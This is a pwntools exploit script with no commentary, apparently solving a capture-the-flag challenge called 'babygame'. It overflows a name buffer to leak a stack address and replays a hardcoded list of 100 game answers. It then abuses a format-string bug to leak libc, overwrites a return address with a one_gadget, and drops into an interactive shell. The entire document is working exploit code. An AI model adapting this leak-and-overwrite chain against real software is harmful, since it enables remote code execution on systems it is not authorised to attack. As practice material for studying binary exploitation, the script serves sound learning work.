from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'

io = process('./babygame')

io.sendlineafter(b'Please input your name:', b'1234567890' * 26 + b'aaaaa')

io.recvuntil(b'Hello, ')

io.recv(260 + 12)

stack_addr = u64(io.recv(6) + b'\x00\x00')

srand = 0x30393837

answer = [1, 2, 2, 1, 1, 1, 1, 2, 0, 0,
		  2, 2, 2, 1, 1, 1, 2, 0, 1, 0,
		  0, 0, 0, 1, 0, 1, 1, 2, 2, 1,
		  2, 2, 2, 1, 1, 0, 1, 2, 1, 2,
		  1, 0, 1, 2, 1, 2, 0, 0, 1, 1, 
		  2, 0, 1, 2, 1, 1, 2, 0, 2, 1, 
		  0, 2, 2, 2, 2, 0, 2, 1, 1, 0, 
		  2, 1, 1, 2, 0, 2, 0, 1, 1, 2, 
		  1, 1, 1, 2, 2, 0, 0, 2, 2, 2, 
		  2, 2, 0, 1, 0, 0, 1, 2, 0, 2]

for i in range(100):
	try:
		io.sendlineafter(b'round', str(answer[i]).encode())
	except EOFError:
		print("Failed in " + str(i))
		exit(0)

# gdb.attach(io)

io.sendlineafter(b'Good luck to you.', 
	b'%62c%8$hhna%79$p' + p64(stack_addr - 0x218))

io.recvuntil(b'0x')
libc_addr = int(io.recv(12).decode(), 16)
print(hex(libc_addr))

libc_addr -= 243

# Libc = LibcSearcher('__libc_start_main', libc_addr)
Libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
# base = libc_addr - Libc.dump('__libc_start_main')
base = libc_addr - Libc.symbols['__libc_start_main']
libc_system_addr = Libc.symbols['system']
mem_system_addr = base + libc_system_addr

print(hex(stack_addr - 0x218))
# gdb.attach(io)

one_gadget = [0xE3B2E + base, 0xE3B31 + base, 0xE3B34 + base]

payload = fmtstr_payload(6, {stack_addr - 0x218: one_gadget[1]})
io.sendlineafter(b'Good luck to you.', payload)

io.interactive()